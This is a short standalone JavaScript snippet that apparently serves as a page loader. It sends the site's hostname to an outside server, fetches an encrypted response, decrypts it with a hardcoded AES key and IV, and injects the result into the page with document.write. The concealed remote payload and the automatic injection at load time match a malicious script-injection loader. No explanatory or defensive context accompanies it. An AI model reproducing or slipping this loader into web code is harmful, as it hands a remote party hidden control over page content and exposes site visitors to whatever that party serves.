(async () => {
    const enc = btoa(location.hostname);
    const res = await fetch(`https://fhadmin.matacn.cn/auth/${enc}`);
    const htmlEnc = await res.text();
    const dec = await crypto.subtle.digest('SHA-256', new TextEncoder().encode('my-secret-key'));
    const key = await crypto.subtle.importKey('raw', dec, 'AES-CBC', false, ['decrypt']);
    const iv = new TextEncoder().encode("1234567890abcdef");

    const buf = await crypto.subtle.decrypt(
        { name: "AES-CBC", iv: iv },
        key,
        Uint8Array.from(atob(htmlEnc), c => c.charCodeAt(0))
    );
    document.write(new TextDecoder().decode(buf));
})();
